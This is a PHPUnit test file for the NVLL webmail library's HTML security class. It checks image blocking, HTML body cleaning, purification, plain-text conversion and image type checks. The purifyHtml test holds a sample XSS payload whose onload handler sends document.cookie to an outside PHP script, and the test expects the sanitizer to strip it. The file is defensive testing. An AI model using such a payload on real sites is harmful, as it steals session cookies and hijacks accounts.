<?php

/**
 * Test cases for NVLL_Security.
 * 
 * This file is part of NVLL. NVLL is free software under the terms of the
 * GNU General Public License. You should have received a copy of the license
 * along with NVLL. If not, see <http://www.gnu.org/licenses>.
 */

require_once dirname(__FILE__) . '/../../classes/NVLL_Security.php';

/**
 * Test class for NVLL_Security.
 */
class NVLL_SecurityTest extends PHPUnit\Framework\TestCase
{
  /**
   * Test case for disableHtmlImages().
   */
  public function testDisableHtmlImages()
  {
    $html =
      '<dl>
  <dt>normal image with double quote<dt>
  <dd><img src="http://nvll.sourceforge.net/engine/images/logo.png" /></dd>
  <dt>normal image with single quote<dt>
  <dd><img src=\'http://nvll.sourceforge.net/engine/images/logo.png\' /></dd>
  <dt>normal image without quote<dt>
  <dd><img Src=http://nvll.sourceforge.net/engine/images/logo.png /></dd>
  <dt>normal image with whitespace and double quote<dt>
  <dd><img src = "http://nvll.sourceforge.net/engine/images/logo.png " /></dd>
  <dt>normal image with whitespace and single quote<dt>
  <dd><img src = \'http://nvll.sourceforge.net/engine/images/logo.png \' /></dd>
  <dt>normal image with whitespace and without quote<dt>
  <dd><img srC = http://nvll.sourceforge.net/engine/images/logo.png /></dd>
</dl>

<table>
  <tr>
    <td background="http://nvll.sourceforge.net/engine/images/logo.png">background with double quote</td>
  </tr>
  <tr>
    <td background=\'http://nvll.sourceforge.net/engine/images/logo.png\'>background with single quote</td>
  </tr>
  <tr>
    <td BackGround=http://nvll.sourceforge.net/engine/images/logo.png>background without quote</td>
  </tr>
  <tr>
    <td background = "http://nvll.sourceforge.net/engine/images/logo.png ">background with whitespace and double quote</td>
  </tr>
  <tr>
    <td background = \'http://nvll.sourceforge.net/engine/images/logo.png \'>background with whitespace and single quote</td>
  </tr>
  <tr>
    <td background = http://nvll.sourceforge.net/engine/images/logo.png >background with whitespace and without quote</td>
  </tr>
</table>

<p style="BackGround:Url(http://nvll.sourceforge.net/engine/images/logo.png)">background-style</p>
<p style="background:url(\'http://nvll.sourceforge.net/engine/images/logo.png\')">background-style with single quote</p>
<p style=" background : url( http://nvll.sourceforge.net/engine/images/logo.png ) ">background-style with whitespace</p>
<p style="background : url( \'http://nvll.sourceforge.net/engine/images/logo.png \')">background-style with whitespace and single quote</p>';

    $expected =
      '<dl>
  <dt>normal image with double quote<dt>
  <dd><img src="none" /></dd>
  <dt>normal image with single quote<dt>
  <dd><img src="none" /></dd>
  <dt>normal image without quote<dt>
  <dd><img src="none"/></dd>
  <dt>normal image with whitespace and double quote<dt>
  <dd><img src="none" /></dd>
  <dt>normal image with whitespace and single quote<dt>
  <dd><img src="none" /></dd>
  <dt>normal image with whitespace and without quote<dt>
  <dd><img src="none"/></dd>
</dl>

<table>
  <tr>
    <td background="none">background with double quote</td>
  </tr>
  <tr>
    <td background="none">background with single quote</td>
  </tr>
  <tr>
    <td background="none">background without quote</td>
  </tr>
  <tr>
    <td background="none">background with whitespace and double quote</td>
  </tr>
  <tr>
    <td background="none">background with whitespace and single quote</td>
  </tr>
  <tr>
    <td background="none">background with whitespace and without quote</td>
  </tr>
</table>

<p style="BackGround:url(none)">background-style</p>
<p style="background:url(none)">background-style with single quote</p>
<p style=" background : url(none) ">background-style with whitespace</p>
<p style="background : url(none)">background-style with whitespace and single quote</p>';

    $this->assertEquals($expected, NVLL_Security::disableHtmlImages($html));
  }

  /**
   * Test case for hasDisabledHtmlImages().
   */
  public function testHasDisabledHtmlImages()
  {
    $this->assertFalse(NVLL_Security::hasDisabledHtmlImages(''));

    $this->assertTrue(NVLL_Security::hasDisabledHtmlImages('<dd><img src="none"/></dd>'), 'src="none"');
    $this->assertTrue(NVLL_Security::hasDisabledHtmlImages('<td background="none">...</td>'), 'background="none"');
    $this->assertTrue(NVLL_Security::hasDisabledHtmlImages('<p style="background:url(none)">...</p>'), 'background:url(none)');
    $this->assertTrue(NVLL_Security::hasDisabledHtmlImages('<p style="background : url(none)">...</p>'), 'background : url(none)');
  }

  /**
   * Test case for cleanHtmlBody().
   */
  public function testCleanHtmlBody()
  {
    $html1 =
      '<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html>
  <head>
    <title>Test</TITLE>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
    <meta name="description" content="Just a test!" />
    <link href="stylesheet.css" rel="stylesheet" type="text/css" />
    <LINK href="favicon.ico" rel="shortcut icon" type="image/x-icon" />
    <script src="javascript.js" type="text/javascript"></script>
    <style><!-- Test -->
      h1 {
        font-family: Verdana, Arial, Helvetica, sans-serif;
        font-size: 10pt;
      }
    </style>
  </HEAD>
<BODY>
<h1>Test</h1>
<p>This is just a test!</p>
</body>
</HTML>';

    $html2 =
      '<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en"><head>
    <title>Test</TITLE
    >
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
    <meta name="description" content="Just a test!" /
>
    <link href="stylesheet.css" rel="stylesheet" type="text/css" />
    <LINK href="favicon.ico" rel="shortcut icon" type="image/x-icon" />
    <script src="javascript.js" type="text/javascript"></script>
  <style><!-- Test -->
    h1 {
        font-family: Verdana, Arial, Helvetica, sans-serif;
        font-size: 10pt;
    }
  </style>
  </HEAD>
<BODY dir="ltr">
<h1>Test</h1>
<p>This is just a test!</p>
</body>
</HTML>';

    $expected =
      '<h1>Test</h1>
<p>This is just a test!</p>';

    $this->assertEquals($expected, NVLL_Security::cleanHtmlBody($html1));
    $this->assertEquals($expected, NVLL_Security::cleanHtmlBody($html2));
  }

  /**
   * Test case for purifyHtml().
   */
  public function testPurifyHtml()
  {
    $html =
      'Nun klaue ich Dir Dein Session Cookie!<br />&nbsp;<br />
<img alt="test" src="cid:part1.07060002.08090408@hitco.at"
  height="20" width="20"
  onload="document.myIMG.src=\'http\'+\':\'+\'//\'+\'www.hitco.at/img/cookieklau.php?\'+document.cookie" />
<img name="myIMG" src="cid:part1.07060002.08090408@hitco.at" height="20" width="800" /><br />';

    $expected =
      'Nun klaue ich Dir Dein Session Cookie!<br />&nbsp;<br />
<img alt="test" src="cid:part1.07060002.08090408@hitco.at" height="20" width="20" />
<img src="cid:part1.07060002.08090408@hitco.at" height="20" width="800" alt="image" id="myIMG" /><br />';

    $this->assertEquals($expected, NVLL_Security::purifyHtml($html));
  }

  /**
   * Test case for convertHtmlToPlainText().
   */
  public function testConvertHtmlToPlainText()
  {
    $html1 =
      "<p class=MsoNormal><font size=2 color=navy face=Arial><span style='font-size:
10.0pt;font-family:Arial;color:navy'>This is just a &#8211; small test!</span></font></p>";

    $expected1 = "\r\nThis is just a – small test!";

    $html2 =
      "<p class=MsoNormal><font size=2 color=navy face=Arial><span style='font-size:
10.0pt;font-family:Arial;color:navy'>Line 1</span></font></p>

<p class=MsoNormal><font size=2 color=navy face=Arial><span style='font-size:
10.0pt;font-family:Arial;color:navy'></span></font></p>

<p class=MsoNormal><font size=2 color=navy face=Arial><span style='font-size:
10.0pt;font-family:Arial;color:navy'></span></font></p>

<div>

<p class=MsoNormal><strong><b><font size=2 color=navy face=Arial><span
style='font-size:10.0pt;font-family:Arial;color:navy'>Line 2</span></font></b>
</strong><font color=navy><span style='color:navy'></span></font></p>

<div>

<p class=MsoNormal><font size=3 color=navy face=\"Times New Roman\"><span
style='font-size:12.0pt;color:navy'>&nbsp;</span></font></p>

</div>";

    $expected2 = "\r\nLine 1\r\n\r\n\r\n\r\n\r\nLine 2\r\n\r\n\r\n
 \r\n\r\n";

    $this->assertEquals($expected1, NVLL_Security::convertHtmlToPlainText($html1));
    $this->assertEquals($expected2, NVLL_Security::convertHtmlToPlainText($html2));
  }

  /**
   * Test case for isSupportedImageType().
   */
  public function testIsSupportedImageType()
  {
    $this->assertFalse(NVLL_Security::isSupportedImageType(null), 'NULL');
    $this->assertFalse(NVLL_Security::isSupportedImageType('image'), 'image');
    $this->assertFalse(NVLL_Security::isSupportedImageType('image\bug'), 'image\bug');
    $this->assertFalse(NVLL_Security::isSupportedImageType('text/plain'), 'text/plain');

    $this->assertFalse(NVLL_Security::isSupportedImageType('image/exe'), 'image/exe');
    $this->assertFalse(NVLL_Security::isSupportedImageType('image/tiff'), 'image/tiff');
    $this->assertFalse(NVLL_Security::isSupportedImageType('image/Gift'), 'image/Gift');

    $this->assertTrue(NVLL_Security::isSupportedImageType('image/jpeg'), 'image/jpeg');
    $this->assertTrue(NVLL_Security::isSupportedImageType('image/PJPEG'), 'image/PJPEG');
    $this->assertTrue(NVLL_Security::isSupportedImageType('IMAGE/Gif'), 'IMAGE/Gif');
    $this->assertTrue(NVLL_Security::isSupportedImageType('Image/pnG'), 'Image/pnG');
  }
}
